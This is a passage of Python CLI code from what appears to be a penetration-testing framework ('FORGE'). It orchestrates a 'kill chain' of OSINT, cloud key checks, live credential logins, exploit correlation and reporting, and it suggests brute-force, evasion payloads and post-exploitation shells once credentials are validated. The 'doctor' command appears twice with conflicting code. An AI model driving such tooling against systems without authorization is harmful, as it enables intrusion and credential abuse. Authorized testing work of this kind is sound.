                        progress_label=f"{iteration}.J cloud validation result prep",
                        progress_callback=_record_batch_progress,
                    )
                    if len(prepared_validation_logs) > 1:
                        _log(
                            f"{iteration}.J cloud validation result log",
                            "[dim]sequential dispatch x1[/dim]  [dim]validation log order preserved[/dim]",
                        )
                    _run_inprocess_batch(
                        prepared_validation_logs,
                        _apply_prepared_log_entry,
                        max_workers=1,
                        progress_label=f"{iteration}.J cloud validation result log",
                        progress_callback=_record_batch_progress,
                    )
                if len(pending_cloud_targets) > 1 and parallel_workers > 1:
                    _log(
                        f"{iteration}.J cloud processed-ref prep",
                        (
                            f"[dim]parallel parse x"
                            f"{min(parallel_workers, len(pending_cloud_targets))}[/dim]"
                        ),
                    )
                prepared_cloud_processed_ref_updates = _run_inprocess_batch(
                    pending_cloud_targets,
                    lambda item: _prepare_processed_set_item(
                        str(item["key"]),
                        normalizer=lambda value: value,
                    ),
                    max_workers=parallel_workers,
                    progress_label=f"{iteration}.J cloud processed-ref prep",
                    progress_callback=_record_batch_progress,
                )
                if len(prepared_cloud_processed_ref_updates) > 1:
                    _log(
                        f"{iteration}.J cloud processed-ref update",
                        "[dim]sequential dispatch x1[/dim]  [dim]processed-ref order preserved[/dim]",
                    )
                _run_inprocess_batch(
                    prepared_cloud_processed_ref_updates,
                    lambda item: _apply_processed_set_item(
                        item,
                        processed_set=processed_cloud_refs,
                    ),
                    max_workers=1,
                    progress_label=f"{iteration}.J cloud processed-ref update",
                    progress_callback=_record_batch_progress,
                )

        queued_artifacts = _queue_discovered_artifacts()
        if queued_artifacts:
            _log(
                f"{iteration}.K2 artifact queue",
                f"[green]{queued_artifacts} artifact URL(s) queued for static analysis[/green]",
            )
        artifact_summary = artifact_processor.process(
            progress_label=f"{iteration}.K3 artifact processing",
            progress_callback=_record_artifact_progress,
        )
        _record_artifact_cumulative_metrics(artifact_summary=artifact_summary)
        if artifact_summary.processed or artifact_summary.skipped:
            _log(
                f"{iteration}.K3 artifact processing",
                (
                    f"processed={artifact_summary.processed} "
                    f"firebase={artifact_summary.firebase_projects} "
                    f"supabase={artifact_summary.supabase_configs} "
                    f"skipped={artifact_summary.skipped}"
                ),
            )
        _run_pending_cloud_asset_validation(f"{iteration}.K3.5 cloud asset validation")
        synthesis_summary = synthesis_engine.run()
        _refresh_root_domains(synthesis_summary.root_domains)
        if synthesis_summary.seeds_inserted or synthesis_summary.relations_inserted:
            _log(
                f"{iteration}.K4 synthesis",
                (
                    f"seeds+={synthesis_summary.seeds_inserted} "
                    f"relations+={synthesis_summary.relations_inserted} "
                    f"roots={len(synthesis_summary.root_domains)}"
                ),
            )
        finding_summary = finding_engine.run()
        if finding_summary.inserted or finding_summary.updated or finding_summary.removed:
            _log(
                f"{iteration}.K5 findings",
                (
                    f"inserted={finding_summary.inserted} "
                    f"updated={finding_summary.updated} "
                    f"removed={finding_summary.removed} "
                    f"active={finding_summary.active_findings}"
                ),
            )
        _run_pending_cloud_key_validation(f"{iteration}.K6 cloud key validation")
        if _maybe_interrupt_run(f"iteration_{iteration}_postfanout"):
            return

        after = _snapshot()
        iteration_delta = {
            label: int(after[index] - before[index])
            for index, label in enumerate(_SNAPSHOT_LABELS)
        }
        counts_stable = after == before
        pending_work_counts = _pending_work_counts() if counts_stable else {}
        pending_work_total = sum(pending_work_counts.values())
        run_progress_state["pending_work_counts"] = pending_work_counts
        run_progress_state["pending_work_total"] = pending_work_total
        is_stable = counts_stable and pending_work_total == 0
        _set_progress_counts(after, iteration_delta=iteration_delta, stable=is_stable)
        if counts_stable and pending_work_total > 0:
            exhausted = iteration >= max_iterations
            _log(
                f"iteration {iteration}",
                (
                    "[dim]no new rows but pending recursive work remains "
                    f"({pending_work_total}) — "
                    f"{'max iterations exhausted' if exhausted else 'continuing'}[/dim]"
                ),
            )
        elif counts_stable:
            _log(f"iteration {iteration}", "[dim]no new items — spider stable, exiting loop[/dim]")
            break
        else:
            _log(f"iteration {iteration}",
                 f"delta hosts=+{after[0]-before[0]} "
                 f"emails=+{after[1]-before[1]} "
                 f"subs=+{after[2]-before[2]} "
                 f"svcs=+{after[3]-before[3]} "
                 f"keys=+{after[4]-before[4]} "
                 f"crawl=+{after[5]-before[5]} "
                 f"gh=+{after[6]-before[6]} "
                 f"social=+{after[7]-before[7]}")

    # ═══════════════════════════════════════════════════════════════════
    # FINAL PHASE - synthesis only (per-iteration OSINT already fired above)
    # ═══════════════════════════════════════════════════════════════════

    # Phase 6 report path is part of the fixed finalization pipeline shape.
    from datetime import datetime as _dt, timezone as _tz  # noqa: PLC0415
    _report_ts = _dt.now(tz=_tz.utc).strftime("%Y%m%dT%H%M%S")
    _report_path = f"reports/engagement_{engagement}_kill_chain_{_report_ts}.md"
    report_args = ["report", "generate", "--engagement", engagement,
                   "--yes", "--output", _report_path]
    if report_provider:
        report_args += ["--provider", report_provider]
    if report_max_loops is not None:
        report_args += ["--max-loops", str(int(report_max_loops))]

    pre_validation_finalization_specs: list[tuple[list[str], str]] = [
        (["osint", "hibp", "--engagement", engagement], "final HIBP domain"),
    ]
    if credential_validate:
        for svc in ("ssh", "smb", "rdp", "ftp", "http"):
            pre_validation_finalization_specs.append(
                (
                    [
                        "osint",
                        "validate",
                        "--engagement",
                        engagement,
                        "--service",
                        svc,
                        "--host",
                        domain,
                    ],
                    f"cred validate ({svc})",
                )
            )
    post_validation_finalization_specs: list[tuple[list[str], str]] = [
        (["vuln", "passive", "--engagement", engagement], "vuln passive fingerprint"),
        (["exploit", "correlate", "--engagement", engagement], "exploit correlate"),
        (
            [
                "graph",
                "build",
                "--engagement",
                engagement,
                "--format",
                "all",
                "--output-dir",
                "reports",
                "--snapshot",
            ],
            "attack-path graph family",
        ),
        (list(report_args), "report generate"),
    ]
    parallel_post_validation_specs = post_validation_finalization_specs[:2]
    sequential_post_validation_specs = post_validation_finalization_specs[2:]
    finalization_specs = [
        *pre_validation_finalization_specs,
        *post_validation_finalization_specs,
    ]

    finalization_started_at = time.perf_counter()
    finalization_completed = 0
    finalization_failed = 0

    def _run_finalization_module(cmd_argv: list[str], label: str) -> int:
        nonlocal finalization_completed, finalization_failed
        total_items = len(finalization_specs)
        _record_finalization_progress(
            label,
            _batch_progress_snapshot(
                total=total_items,
                workers=1,
                completed=finalization_completed,
                failed=finalization_failed,
                started_at=finalization_started_at,
            ),
        )
        result = int(_run_module(cmd_argv, label))
        finalization_completed += 1
        if result != 0:
            finalization_failed += 1
        _record_finalization_progress(
            label,
            _batch_progress_snapshot(
                total=total_items,
                workers=1,
                completed=finalization_completed,
                failed=finalization_failed,
                started_at=finalization_started_at,
            ),
        )
        return result

    def _record_finalization_batch_progress(
        label: str,
        metrics: dict[str, object],
        *,
        completed_offset: int,
        failed_offset: int,
    ) -> None:
        _record_finalization_progress(
            label,
            _batch_progress_snapshot(
                total=len(finalization_specs),
                workers=max(1, int(metrics.get("workers") or 1)),
                completed=completed_offset + int(metrics.get("completed") or 0),
                failed=failed_offset + int(metrics.get("failed") or 0),
                started_at=finalization_started_at,
            ),
        )

    # For prereq detection reporting: total emails processed across all iterations
    emails = sorted(processed_emails)
    if _maybe_interrupt_run("pre_finalization"):
        return

    # Credential validation (opt-in via --credential-validate)
    if credential_validate:
        _log("cred validate", "[yellow]--credential-validate set - attempting live logins[/yellow]")
        credential_validation_inputs = list(pre_validation_finalization_specs[1:])
        if len(credential_validation_inputs) > 1 and parallel_workers > 1:
            _log(
                "cred validate spec prep",
                f"[dim]parallel parse x{min(parallel_workers, len(credential_validation_inputs))}[/dim]",
            )
        credential_validation_specs = _run_inprocess_batch(
            credential_validation_inputs,
            lambda item: ModuleDispatchSpec(cmd_argv=list(item[0]), label=item[1]),
            max_workers=parallel_workers,
            progress_label="cred validate spec prep",
            progress_callback=_record_batch_progress,
        )
        if len(credential_validation_specs) > 1 and parallel_workers > 1:
            _log(
                "cred validate",
                f"[dim]parallel dispatch x{min(parallel_workers, len(credential_validation_specs))}[/dim]",
            )
        completed_offset = finalization_completed
        failed_offset = finalization_failed
        credential_results = _run_module_batch(
            credential_validation_specs,
            _run_module,
            max_workers=parallel_workers,
            progress_label="cred validate batch",
            progress_callback=lambda label, metrics: _record_finalization_batch_progress(
                label,
                metrics,
                completed_offset=completed_offset,
                failed_offset=failed_offset,
            ),
        )
        finalization_completed += len(credential_results)
        finalization_failed += sum(1 for result in credential_results if int(result) != 0)
    else:
        _log("cred validate", "[dim]skipped (pass --credential-validate to enable)[/dim]")

    # Cloud scan summary (actual scans ran per-iteration in fan-out J)
    if not skip_cloud:
        _run_pending_cloud_key_validation("final cloud key validation")
        _cli_audit(
            db_path, engagement_id, "orchestrator", "kill_chain",
            "cloud_scan_summary", target=domain,
            result=(
                f"supabase={len(all_cloud_refs['supabase'])} "
                f"firebase={len(all_cloud_refs['firebase'])} "
                f"aws_s3={len(all_cloud_refs['aws_s3'])} "
                f"gcs={len(all_cloud_refs['gcs'])} "
                f"azure_blob={len(all_cloud_refs['azure_blob'])} "
                f"amplify={len(all_cloud_refs['amplify'])} "
                f"gcp_appspot={len(all_cloud_refs['gcp_appspot'])} "
                f"gcp_cf={len(all_cloud_refs['gcp_cloudfunctions'])} "
                f"cf_pages={len(all_cloud_refs['cloudflare_pages'])} "
                f"cf_workers={len(all_cloud_refs['cloudflare_worker'])} "
                f"cf_r2={len(all_cloud_refs['cloudflare_r2'])} "
                f"github_pages={len(all_cloud_refs['github_pages'])} "
                f"gitlab_pages={len(all_cloud_refs['gitlab_pages'])} "
                f"vercel={len(all_cloud_refs['vercel'])} "
                f"netlify={len(all_cloud_refs['netlify'])} "
                f"scans_run={len(processed_cloud_refs)}"
            ),
        )

    # HIBP domain intel, passive vuln fingerprinting, and exploit
    # correlation are independent of each other, so batch them before the
    # dependency-bound graph/report tail.
    pregraph_finalization_inputs = [
        pre_validation_finalization_specs[0],
        *parallel_post_validation_specs,
    ]
    if len(pregraph_finalization_inputs) > 1 and parallel_workers > 1:
        _log(
            "finalization pregraph spec prep",
            f"[dim]parallel parse x{min(parallel_workers, len(pregraph_finalization_inputs))}[/dim]",
        )
    pregraph_finalization_specs = _run_inprocess_batch(
        pregraph_finalization_inputs,
        lambda item: ModuleDispatchSpec(cmd_argv=list(item[0]), label=item[1]),
        max_workers=parallel_workers,
        progress_label="finalization pregraph spec prep",
        progress_callback=_record_batch_progress,
    )
    if len(pregraph_finalization_specs) > 1 and parallel_workers > 1:
        _log(
            "finalization pregraph",
            f"[dim]parallel dispatch x{min(parallel_workers, len(pregraph_finalization_specs))}[/dim]",
        )
    completed_offset = finalization_completed
    failed_offset = finalization_failed
    pregraph_results = _run_module_batch(
        pregraph_finalization_specs,
        _run_module,
        max_workers=parallel_workers,
        progress_label="finalization pregraph batch",
        progress_callback=lambda label, metrics: _record_finalization_batch_progress(
            label,
            metrics,
            completed_offset=completed_offset,
            failed_offset=failed_offset,
        ),
    )
    finalization_completed += len(pregraph_results)
    finalization_failed += sum(1 for result in pregraph_results if int(result) != 0)

    # The consolidated graph/export build must finish before report generation.
    if len(sequential_post_validation_specs) > 1:
        _log(
            "finalization postgraph",
            "[dim]sequential dispatch x1[/dim]  [dim]graph/report order preserved[/dim]",
        )
    _run_inprocess_batch(
        sequential_post_validation_specs,
        lambda item: _run_finalization_module(list(item[0]), str(item[1])),
        max_workers=1,
        progress_label="finalization postgraph",
    )

    total = _time.time() - step_start
    _cli_audit(
        db_path, engagement_id, "orchestrator", "kill_chain",
        "kill_chain_complete", target=domain,
        result=f"elapsed_s={total:.1f} emails_chained={len(emails) if emails else 0}",
    )
    console.print(f"\n[bold green]Kill-chain complete[/bold green] in {total:.1f}s")
    console.print(f"[dim]Report:[/dim] {_report_path}")
    console.print(f"[dim]Evidence:[/dim] .forge_data/engagements/{engagement}.db")
    _mtgx = f"reports/{engagement}_attack_graph.mtgx"
    _mg = f"reports/{engagement}_attack_graph.graphml"
    _mn = f"reports/{engagement}_attack_graph_nodes.csv"
    _me = f"reports/{engagement}_attack_graph_edges.csv"
    from pathlib import Path as _P3  # noqa: PLC0415
    if _P3(_mg).is_file() or _P3(_mtgx).is_file():
        if _P3(_mtgx).is_file():
            console.print(f"[dim]Maltego workspace:[/dim] {_mtgx}")
        if _P3(_mg).is_file():
            console.print(f"[dim]Maltego graphml:[/dim] {_mg}")
        console.print(f"[dim]Maltego CSVs:[/dim] {_mn}  |  {_me}")
        console.print(
            "[dim]  -> open the .mtgx in Maltego Graph (Desktop), or import the "
            ".graphml in Community Edition if you need the lightweight path.[/dim]"
        )

    # ─── Auto-regenerate the cross-engagement dashboard ──────────────
    try:
        from forge.reporting.dashboard import generate_dashboard  # noqa: PLC0415
        _dash_path = _P3("reports/dashboard.html")
        _dash_path.parent.mkdir(parents=True, exist_ok=True)
        generate_dashboard(
            data_dir=_P3(cfg.data_dir),
            reports_dir=_P3("reports"),
            output_path=_dash_path,
        )
        console.print(f"[dim]Dashboard:[/dim] {_dash_path} "
                      "[dim](refreshed)[/dim]")
    except Exception as _exc:  # noqa: BLE001
        console.print(f"[dim]Dashboard refresh skipped: {_exc}[/dim]")

    _refresh_pending_work_state()
    _set_progress_counts()
    engagement_run_tracker.finish_run(
        engagement_run_handle,
        status="completed",
        current_iteration=last_iteration,
        metadata={
            **_engagement_run_metadata(phase="completed"),
            "elapsed_seconds": round(total, 3),
            "report_path": _report_path,
            "report_provider": report_provider or "default",
            "report_max_loops": report_max_loops,
        },
    )
    _clear_run_control_markers()

    # ═══════════════════════════════════════════════════════════════════
    # PREREQUISITE DETECTION - tell the operator which extra tools would
    # work on this machine but weren't auto-run because they need special
    # inputs / creds / consent. Each entry either has a concrete argv
    # (runnable via --auto-run-detected or Y/N prompt) or a manual_hint
    # (requires --target-url / --service and can only be shown as text).
    # ═══════════════════════════════════════════════════════════════════
    import os as _os2  # noqa: PLC0415
    import sys as _sys2  # noqa: PLC0415
    from pathlib import Path as _P2  # noqa: PLC0415

    detected: list[dict[str, object]] = []

    def _add(label: str, reason: str,
             argv: Optional[list[str]] = None,
             manual_hint: Optional[str] = None) -> None:
        detected.append({
            "label": label,
            "reason": reason,
            "argv": argv,
            "manual_hint": manual_hint,
            "runnable": argv is not None,
        })

    # DeHashed - paired env creds
    if _os2.environ.get("FORGE_DEHASHED_API_KEY") and _os2.environ.get("FORGE_DEHASHED_EMAIL"):
        _add(
            "osint dehashed (Module 2-C)",
            "FORGE_DEHASHED_* env vars are set",
            argv=["osint", "dehashed", "--engagement", engagement,
                  "--query-type", "domain", "--query-value", domain],
        )

    # Local breach DB
    breach_dir = _P2(".forge_data/breach")
    if breach_dir.is_dir():
        dumps = [p for p in breach_dir.glob("*") if p.is_file()]
        if dumps:
            _add(
                "osint breach (Module 2-A)",
                f"{len(dumps)} breach dump(s) in .forge_data/breach/",
                argv=["osint", "breach", "--engagement", engagement,
                      "--db", str(dumps[0])],
            )

    # AWS
    if _os2.environ.get("AWS_PROFILE") or _os2.environ.get("AWS_ACCESS_KEY_ID"):
        _add(
            "cloud aws (Module 4)",
            "AWS creds detected in env",
            argv=["cloud", "aws", "--engagement", engagement],
        )

    # Azure
    if _os2.environ.get("FORGE_AZURE_SUBSCRIPTION_ID") or _os2.environ.get("AZURE_TENANT_ID"):
        _add(
            "cloud azure (Module 4)",
            "Azure creds detected in env",
            argv=["cloud", "azure", "--engagement", engagement],
        )

    # Firebase from local artifact intake roots
    from forge.engagement_orchestrator import default_local_artifact_roots  # noqa: PLC0415

    local_artifact_roots = [path for path in default_local_artifact_roots(_P2.cwd()) if path.is_dir()]
    apks: list[_P2] = []
    for artifact_root in local_artifact_roots:
        apks.extend(p for p in artifact_root.glob("*.apk") if p.is_file())
        apks.extend(p for p in artifact_root.glob("*.aab") if p.is_file())
        apks.extend(p for p in artifact_root.glob("*.xapk") if p.is_file())
        apks.extend(p for p in artifact_root.glob("*.apkm") if p.is_file())
        apks.extend(p for p in artifact_root.glob("*.apks") if p.is_file())
        apks.extend(p for p in artifact_root.glob("*.ipa") if p.is_file())
    if apks:
        visible_roots = ", ".join(path.as_posix() for path in local_artifact_roots[:4])
        _add(
            "cloud firebase-extract (Module 4-F)",
            f"{len(apks)} mobile package(s) across {visible_roots}",
            argv=["cloud", "firebase-extract", "--engagement", engagement,
                  "--apk", str(apks[0])],
        )

    # Evasion generation - requires SAFE_MODE=0. Manual only (needs --technique).
    if _os2.environ.get("FORGE_SAFE_MODE", "0").strip() in ("0", "false", "no", ""):
        _add(
            "evasion generate (Phase 3)",
            "FORGE_SAFE_MODE is off - payload generation available",
            manual_hint=(f"forge evasion generate --engagement {engagement} "
                         "--technique <lolbin-technique> --os windows"),
        )

    # Vuln IDOR / Auth brute / bypass - manual only (need --target-url).
    con = _sq.connect(f"file:{db_path.as_posix()}?mode=ro", uri=True)
    try:
        n_svcs = 0
        n_creds = 0
        try:
            n_svcs = con.execute(
                "SELECT COUNT(*) FROM services s JOIN hosts h ON s.host_id=h.id "
                "WHERE h.engagement_id=?", (engagement_id,),
            ).fetchone()[0]
        except _sq.OperationalError:
            pass
        try:
            n_creds = con.execute(
                "SELECT COUNT(*) FROM credentials WHERE engagement_id=?",
                (engagement_id,),
            ).fetchone()[0]
        except _sq.OperationalError:
            pass
    finally:
        con.close()
    if n_svcs > 0:
        _add(
            "vuln idor (Module 4-D)",
            f"{n_svcs} discovered service(s) - IDOR probing available",
            manual_hint=f"forge vuln idor --engagement {engagement} --target-url <url>",
        )
    if n_svcs > 0 and n_creds > 0:
        _add(
            "auth brute (Phase 4)",
            f"{n_svcs} service(s) + {n_creds} credential(s) - brute-force ready",
            manual_hint=(f"forge auth brute --engagement {engagement} "
                         "--target <host> --service <svc>"),
        )
    if n_svcs > 0:
        _add(
            "auth bypass (Phase 4)",
            f"{n_svcs} service(s) with potential auth surfaces",
            manual_hint=f"forge auth bypass --engagement {engagement} --target-url <url>",
        )

    # Phase 5 post-exploitation - only surface if we have validated creds
    try:
        con = _sq.connect(f"file:{db_path.as_posix()}?mode=ro", uri=True)
        try:
            n_validated = con.execute(
                "SELECT COUNT(*) FROM credentials WHERE engagement_id=? AND validated=1",
                (engagement_id,),
            ).fetchone()[0]
        except _sq.OperationalError:
            n_validated = 0
        con.close()
    except Exception:  # noqa: BLE001
        n_validated = 0
    if n_validated > 0:
        _add(
            "post {shell,beacon,lateral} (Phase 5)",
            f"{n_validated} VALIDATED credential(s) - post-ex viable "
            "(requires FORGE_SAFE_MODE=0 + written ROE)",
            manual_hint=(f"forge post shell --engagement {engagement} "
                         "--target <host> --service ssh --cred-id <id>"),
        )

    _cli_audit(
        db_path, engagement_id, "orchestrator", "kill_chain",
        "prereq_detection", target=domain,
        result=f"detected={len(detected)} auto_run={auto_run_detected}",
    )

    if not detected:
        console.print(
            "\n[dim]No additional tools currently applicable. Add breach dumps to "
            ".forge_data/breach/, set AWS/Azure creds in .env, or place APKs/configs "
            "under data/mobile/, data/artifacts/, data/evidence/, or data/uploads/ "
            "to unlock more.[/dim]"
        )
        return

    # Display detected list
    console.print(
        f"\n[bold yellow]Additional tools available on this engagement[/bold yellow] "
        f"([dim]{len(detected)} detected[/dim]):"
    )
    for d in detected:
        marker = "[green]RUNNABLE[/green]" if d["runnable"] else "[dim]manual[/dim]"
        console.print(f"  [cyan]*[/cyan] [bold]{d['label']}[/bold] {marker} - {d['reason']}")
        if d["argv"] is not None:
            argv = d["argv"]  # type: ignore[assignment]
            preview = "forge " + " ".join(argv)  # type: ignore[arg-type]
            console.print(f"       [dim]{preview}[/dim]")
        elif d["manual_hint"]:
            console.print(f"       [dim]{d['manual_hint']}[/dim]")

    # Determine execution mode
    runnable = [d for d in detected if d["runnable"]]
    if not runnable:
        console.print(
            "\n[dim]None are auto-runnable (all need --target-url or per-service "
            "params). Copy the suggested command when ready.[/dim]"
        )
        return

    is_tty = _sys2.stdin.isatty() and _sys2.stdout.isatty()

    if auto_run_detected:
        console.print(
            f"\n[bold cyan]--auto-run-detected set[/bold cyan] - running "
            f"{len(runnable)} runnable prereq(s) now."
        )
        prereq_inputs = [
            d
            for d in runnable
            if d.get("argv") is not None
        ]
        if len(prereq_inputs) > 1 and parallel_workers > 1:
            _log(
                "prereq spec prep",
                f"[dim]parallel parse x{min(parallel_workers, len(prereq_inputs))}[/dim]",
            )
        prereq_specs = _run_inprocess_batch(
            prereq_inputs,
            lambda item: ModuleDispatchSpec(
                cmd_argv=_detected_prereq_child_argv(
                    list(item["argv"]),  # type: ignore[arg-type]
                    roe_id=roe_id,
                    scope_manifest=scope_manifest,
                ),
                label=f"prereq: {item['label']}",
            ),
            max_workers=parallel_workers,
            progress_label="prereq spec prep",
            progress_callback=_record_batch_progress,
        )
        if len(prereq_specs) > 1 and parallel_workers > 1:
            _log(
                "prereq auto-run",
                f"[dim]parallel dispatch x{min(parallel_workers, len(prereq_specs))}[/dim]",
            )
        prereq_results = _run_module_batch(
            prereq_specs,
            _run_module,
            max_workers=parallel_workers,
        )
        prereq_failures = sum(1 for result in prereq_results if int(result) != 0)
        _cli_audit(
            db_path, engagement_id, "orchestrator", "kill_chain",
            "prereq_auto_run", target=domain,
            result=(
                f"ran={len(prereq_specs)} failed={prereq_failures} "
                f"workers={min(parallel_workers, len(prereq_specs) or 1)}"
            ),
        )
    elif is_tty:
        console.print(
            f"\n[bold]{len(runnable)} tool(s) can be run now.[/bold] "
            "Press Y to run each, any other key to skip.\n"
        )
        ran = 0
        for d in runnable:
            try:
                resp = input(f"Run [{d['label']}]? [y/N]: ").strip().lower()
            except (EOFError, KeyboardInterrupt):
                console.print("[dim]input cancelled - stopping prereq prompts[/dim]")
                break
            if resp == "y":
                _run_module(d["argv"], f"prereq: {d['label']}")  # type: ignore[arg-type]
                ran += 1
        _cli_audit(
            db_path, engagement_id, "orchestrator", "kill_chain",
            "prereq_prompted", target=domain,
            result=f"offered={len(runnable)} ran={ran}",
        )
    else:
        console.print(
            "\n[dim]Non-TTY invocation - not prompting. Re-run interactively "
            "or pass --auto-run-detected to execute the RUNNABLE entries.[/dim]"
        )


@app.command("dashboard")
def dashboard(
    output: Optional[str] = typer.Option(
        None, "--output", "-o",
        help="Output HTML path. Defaults to reports/dashboard.html.",
    ),
    open_browser: bool = typer.Option(
        False, "--open",
        help="Open the generated dashboard in your default browser.",
    ),
) -> None:
    """Build a static HTML dashboard of every engagement + report.

    Generates a searchable overview page plus companion per-engagement
    detail pages containing evidence tables, report previews, audit
    history, and attack-graph artifact links. No web server required -
    just open the dashboard HTML file.
    """
    from forge.config import ForgeConfig  # noqa: PLC0415
    from forge.reporting.dashboard import generate_dashboard  # noqa: PLC0415
    from pathlib import Path as _P  # noqa: PLC0415

    cfg = ForgeConfig.load()
    data_dir = _P(cfg.data_dir)
    reports_dir = _P("reports")
    out_path = _P(output) if output else reports_dir / "dashboard.html"
    out_path.parent.mkdir(parents=True, exist_ok=True)

    result = generate_dashboard(
        data_dir=data_dir,
        reports_dir=reports_dir,
        output_path=out_path,
    )
    size = result.stat().st_size
    console.print(f"[bold green]Dashboard:[/bold green] {result}")
    console.print(f"  {size:,} bytes")
    console.print(f"  [dim]open in browser: start {result}[/dim]")
    if open_browser:
        import webbrowser
        webbrowser.open(result.resolve().as_uri())
@app.command("doctor")
def doctor() -> None:
    """Proactive environment and dependency health check."""
    import platform
    import shutil
    import sys
    import sqlite3
    from rich.table import Table
    from forge.config import ForgeConfig

    console.print("\n[bold cyan]FORGE Doctor[/bold cyan] - Environment Health Check\n")
    
    cfg = ForgeConfig.load()
    table = Table(show_header=True, header_style="bold magenta")
    table.add_column("Component", width=20)
    table.add_column("Status", width=15)
    table.add_column("Details")

    table.add_row("OS Platform", "[green]OK[/green]", f"{platform.system()} {platform.release()}")
    table.add_row("Python Version", "[green]OK[/green]", sys.version.split()[0])

    db_path = cfg.kb_db_path
    if db_path.exists():
        try:
            with sqlite3.connect(str(db_path)) as conn:
                count = conn.execute("SELECT count(*) FROM cve_records").fetchone()[0]
                if count > 0:
                    table.add_row("Knowledge Base", "[green]OK[/green]", f"{count} CVEs loaded")
                else:
                    table.add_row("Knowledge Base", "[yellow]EMPTY[/yellow]", "Run `forge kb sync`")
        except Exception as e:
            table.add_row("Knowledge Base", "[red]ERROR[/red]", str(e))
    else:
        table.add_row("Knowledge Base", "[yellow]MISSING[/yellow]", "Run `forge kb sync`")

    for bin_name in ["nmap", "masscan", "sherlock", "kiro-cli", "claude"]:
        path = shutil.which(bin_name)
        if path:
            table.add_row(f"Binary: {bin_name}", "[green]OK[/green]", str(path))
        else:
            table.add_row(f"Binary: {bin_name}", "[yellow]MISSING[/yellow]", "Not found in PATH")

    if cfg.shodan_key:
        table.add_row("Shodan API", "[green]OK[/green]", "Configured")
    else:
        table.add_row("Shodan API", "[yellow]MISSING[/yellow]", "FORGE_SHODAN_API_KEY not set")

    if cfg.github_token:
        table.add_row("GitHub Token", "[green]OK[/green]", "Configured")
    else:
        table.add_row("GitHub Token", "[yellow]MISSING[/yellow]", "FORGE_GITHUB_TOKEN not set")

    console.print(table)
    console.print()
@app.command("doctor")
def doctor() -> None:
    """Proactive environment and dependency health check."""
    import platform
    import shutil
    import sys
    import sqlite3
    from rich.table import Table
    from forge.config import ForgeConfig

    console.print("\n[bold cyan]FORGE Doctor[/bold cyan] - Environment Health Check\n")
    
    cfg = ForgeConfig.load()
    table = Table(show_header=True, header_style="bold magenta")
    table.add_column("Component", width=20)
    table.add_column("Status", width=15)
    table.add_column("Details")

    table.add_row("OS Platform", "[green]OK[/green]", f"{platform.system()} {platform.release()}")
    table.add_row("Python Version", "[green]OK[/green]", sys.version.split()[0])

    db_path = cfg.kb_path
    if db_path.exists():
        try:
            with sqlite3.connect(str(db_path)) as conn:
                count = conn.execute("SELECT count(*) FROM cve").fetchone()[0]
                if count > 0:
                    table.add_row("Knowledge Base", "[green]OK[/green]", f"{count} CVEs loaded")
                else:
                    table.add_row("Knowledge Base", "[yellow]EMPTY[/yellow]", "Run `forge kb sync`")
        except Exception as e:
            table.add_row("Knowledge Base", "[red]ERROR[/red]", str(e))
    else:
        table.add_row("Knowledge Base", "[yellow]MISSING[/yellow]", "Run `forge kb sync`")

    for bin_name in ["nmap", "masscan", "sherlock", "kiro-cli", "claude", "sqlmap"]:
        path = shutil.which(bin_name)
        if path:
            table.add_row(f"Binary: {bin_name}", "[green]OK[/green]", str(path))
        else:
            table.add_row(f"Binary: {bin_name}", "[yellow]MISSING[/yellow]", "Not found in PATH")

    if cfg.shodan_key:
        table.add_row("Shodan API", "[green]OK[/green]", "Configured")
    else:
        table.add_row("Shodan API", "[yellow]MISSING[/yellow]", "FORGE_SHODAN_API_KEY not set")

    import os
    if os.environ.get("FORGE_GITHUB_TOKEN"):
        table.add_row("GitHub Token", "[green]OK[/green]", "Configured")
    else:
        table.add_row("GitHub Token", "[yellow]MISSING[/yellow]", "FORGE_GITHUB_TOKEN not set")

    console.print(table)
    console.print()


@app.command("scaffold")
def scaffold(
    output_dir: str = typer.Option(".", "--output", "-o"),
) -> None:
    """Generate the full obfuscated directory scaffold for a new FORGE deployment."""
    from forge.opsec.scaffold import generate_scaffold  # noqa: PLC0415

    generate_scaffold(output_dir=output_dir)


@app.command("menu")
def menu(
    advanced: bool = typer.Option(
        False,
        "--advanced",
        help=(
            "Launch the legacy questionary-based menu (forge.menu_shell). "
            "The default menu is the cleaner rich TUI in forge.tui.main_menu."
        ),
    ),
) -> None:
    """Launch the interactive engagement menu (TUI)."""
    if not sys.stdin.isatty():
        console.print(
            "[bold yellow]forge menu requires an interactive terminal.[/bold yellow]\n"
            "Non-TTY invocations (subprocess, pipe, CI, redirected stdin) would\n"
            "crash prompt_toolkit's Win32Output with NoConsoleScreenBufferError.\n"
            "Run this command directly from your terminal instead."
        )
        raise typer.Exit(code=2)
    if advanced:
        from forge.menu_shell import run_menu as run_advanced_menu  # noqa: PLC0415

        run_advanced_menu()
        return
    from forge.tui.main_menu import run_menu  # noqa: PLC0415

    run_menu()


# ---------------------------------------------------------------------------
# Entrypoint
# ---------------------------------------------------------------------------


def main() -> None:
    app()


if __name__ == "__main__":
    main()
